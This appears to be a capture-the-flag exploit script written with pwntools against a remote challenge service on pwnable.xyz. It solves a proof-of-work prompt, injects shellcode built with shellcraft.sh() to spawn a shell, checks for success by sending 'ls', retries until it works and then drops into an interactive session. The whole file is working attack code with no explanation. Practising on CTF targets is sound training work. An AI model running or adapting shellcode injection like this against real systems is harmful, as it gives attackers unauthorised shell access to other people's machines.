from pwn import *
context(arch='amd64')

LOCAL = False

while 1:
    if LOCAL:
        r = process('./release/challenge')
    else:
        try:
            r = remote('svc.pwnable.xyz', 30025)
        except:
            continue

    sla = r.sendlineafter
    sa = r.sendafter


    # solve_pow

    r.recvuntil('POW: x + y == 0x')
    answer = int(r.recvline()[:-1], 16)
    sla('> ', str(0) + ' ' + str(answer))


    # execute shellcode

    sc = b'\x01\x00'
    sc += asm(shellcraft.sh())
    
    sa('Input: ', sc)

    try:
        r.sendline('ls')
        print(r.recvline())
        break
    except:
        r.close()


r.interactive()